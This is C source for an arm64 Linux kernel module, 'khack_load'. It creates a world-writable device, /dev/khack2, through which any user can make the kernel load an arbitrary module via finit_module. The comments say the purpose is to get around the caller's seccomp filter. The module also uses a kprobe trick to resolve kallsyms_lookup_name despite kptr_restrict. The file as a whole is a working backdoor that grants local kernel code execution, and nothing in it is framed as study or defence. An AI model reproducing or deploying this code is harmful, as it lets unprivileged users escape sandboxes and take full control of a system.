/*
 * khack_load - kernel-side module loader.
 *
 * One job only: take a path from userspace and hand it to finit_module(),
 * which runs in kernel context and therefore ignores the caller's seccomp
 * filter.
 *
 * Symbol addresses are resolved in-kernel with a kprobe on
 * "kallsyms_lookup_name": registering a probe by name fills in kp.addr, which
 * gives us the function pointer without reading /proc/kallsyms and without
 * needing kptr_restrict lowered.
 */
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/file.h>
#include <linux/miscdevice.h>
#include <linux/kprobes.h>
#include <linux/uaccess.h>
#include <linux/slab.h>

#define DEV_NAME "khack2"

typedef unsigned long (*klname_fn)(const char *);
typedef long (*sysfn_fn)(const struct pt_regs *);

static klname_fn p_klname;

static int resolve_symbols(void)
{
	struct kprobe kp = { .symbol_name = "kallsyms_lookup_name" };
	int ret;

	ret = register_kprobe(&kp);
	if (ret < 0) {
		pr_err("khack_load: kprobe failed %d\n", ret);
		return ret;
	}
	p_klname = (klname_fn)kp.addr;
	unregister_kprobe(&kp);

	if (!p_klname) {
		pr_err("khack_load: kallsyms_lookup_name unresolved\n");
		return -ENOENT;
	}
	pr_info("khack_load: kallsyms_lookup_name=%px\n", p_klname);
	return 0;
}

static int do_load(const char __user *upath)
{
	char path[256];
	struct file *f;
	sysfn_fn sysfn;
	struct pt_regs regs;
	int fd, ret;

	if (!p_klname)
		return -ENOSYS;
	if (strncpy_from_user(path, upath, sizeof(path) - 1) < 0)
		return -EFAULT;
	path[sizeof(path) - 1] = 0;

	sysfn = (sysfn_fn)p_klname("__arm64_sys_finit_module");
	if (!sysfn)
		return -ENOSYS;

	f = filp_open(path, O_RDONLY, 0);
	if (IS_ERR(f))
		return PTR_ERR(f);

	fd = get_unused_fd_flags(O_RDONLY);
	if (fd < 0) {
		filp_close(f, NULL);
		return fd;
	}
	fd_install(fd, f);

	memset(&regs, 0, sizeof(regs));
	regs.regs[0] = fd;
	regs.regs[1] = (unsigned long)(upath + strlen(path));
	regs.regs[2] = 0;
	regs.sp = (unsigned long)__builtin_frame_address(0);
	ret = (int)sysfn(&regs);

	{
		void (*p_close)(unsigned int) =
			(void (*)(unsigned int))p_klname("ksys_close");
		if (p_close)
			p_close(fd);
	}

	pr_info("khack_load: %s -> %d\n", path, ret);
	return ret;
}

static long dev_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
{
	if (cmd != 0x4b02)
		return -EINVAL;
	return do_load((const char __user *)arg);
}

static const struct file_operations dev_fops = {
	.owner          = THIS_MODULE,
	.unlocked_ioctl = dev_ioctl,
	.compat_ioctl   = dev_ioctl,
};

static struct miscdevice dev = {
	.minor = MISC_DYNAMIC_MINOR,
	.name  = DEV_NAME,
	.fops  = &dev_fops,
	.mode  = 0666,
};

static int __init khack_load_init(void)
{
	int ret = resolve_symbols();

	if (ret)
		return ret;

	ret = misc_register(&dev);
	if (ret) {
		pr_err("khack_load: misc_register %d\n", ret);
		return ret;
	}
	return 0;
}

static void __exit khack_load_exit(void)
{
	misc_deregister(&dev);
}

module_init(khack_load_init);
module_exit(khack_load_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("kernel-side module loader");
